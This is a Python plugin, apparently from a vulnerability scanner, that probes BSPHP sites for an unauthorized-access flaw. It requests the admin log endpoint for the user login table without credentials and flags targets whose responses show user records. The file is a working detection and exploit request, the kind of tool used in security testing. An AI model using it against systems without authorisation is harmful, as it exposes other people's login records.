#!/user/bin/env python3
# -*- coding: utf-8 -*-
import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()
class BSPHP_Wsq_Scan:
    def get_url(self,input_url):
        try:
            url = input_url + '/admin/index.php?m=admin&c=log&a=table_json&json=get&soso_ok=1&t=user_login_log&page=1&limit=10&bsphptime=1600407394176&soso_id=1&soso=&DESC=0'
            req = requests.get(url,headers=self.headers,proxies=self.proxy,verify=self.ssl)
            if "id" in req.text and "user" in req.text:
                if not self.batch:
                    OutPrintInfoSuc("BSPHP", '目标存在BSPHP index.php未授权访问信息漏洞')
                    OutPrintInfo("BSPHP", url)
                else:
                    OutPrintInfoSuc("BSPHP", f'目标存在漏洞: {url}')
                    OutPutFile("bsphp_wsq.txt",f'目标存在BSPHP index.php未授权访问信息漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("BSPHP", f'目标 {input_url} 不存在BSPHP index.php未授权访问信息漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("BSPHP",'目标请求出错')
            return False


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("BSPHP", '开始检测BSPHP index.php未授权访问信息漏洞...')
        self.get_url(url)

        if not self.batch:
            OutPrintInfo("BSPHP", 'BSPHP index.php未授权访问信息漏洞检测结束')



